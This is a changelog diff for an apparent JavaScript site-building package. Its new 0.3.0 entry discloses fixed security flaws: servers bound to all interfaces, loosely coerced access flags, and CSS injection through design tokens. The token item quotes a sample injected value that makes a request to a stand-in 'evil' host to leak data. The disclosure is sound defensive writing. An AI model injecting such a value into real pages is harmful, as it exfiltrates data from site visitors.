@@ -2,6 +2,33 @@
 
 All notable changes to `@noidmejs/atomkit-app`. Pre-1.0: minor versions may break.
 
+## 0.3.0
+
+### Security — BREAKING
+- **The dev and start servers bound every network interface.** Both called
+  `server.listen(port)` with no host, which binds the unspecified address — while
+  SECURITY.md claimed localhost and `start` even logged `http://localhost`. Anyone
+  on the same LAN could reach pages rendered with your config's `secrets` and
+  whatever governance context you set for testing (e.g. `canViewPii: true`). Both
+  now bind **`127.0.0.1`**; pass **`--host 0.0.0.0`** to opt in explicitly.
+- **`atomkit.config.json` was parsed with no validation, and governance flags were
+  coerced with `!!`.** `"canViewPii": "false"` — a truthy *string*, and the single
+  most likely JSON mistake — silently granted PII and protected-content visibility,
+  and the build then baked that content permanently into publicly served HTML. The
+  config is now strictly validated (types + unknown keys) and fails the build loudly;
+  `canViewPii` / `canViewProtected` / `analytics` require an exact `true`.
+- **Design tokens re-opened the CSS-exfiltration hole** that core's `clean()` closes.
+  `tokensCss` stripped only `<>{}`, so `"red;background:url(https://evil/?leak)"`
+  became a second live declaration on `:root` and fired a request on page load.
+  Token values are now held to the same bar as style values, and rejected outright.
+
+### Fixed
+- **`build` claimed the ejected component keeps a client-side fetch. It never did.**
+  `codegen` emits no fetch, so a data-bound node in `components/*.tsx` renders its
+  authored fallback forever, and responsive overrides and `video` are dropped. The
+  build now prints every such divergence per page, and the comment + README that
+  asserted otherwise are corrected.
+
 ## 0.2.0
 ### Added — server-side data binding
 - An `api=`-bound `.aql` node is now resolved **on the server at build/dev time**
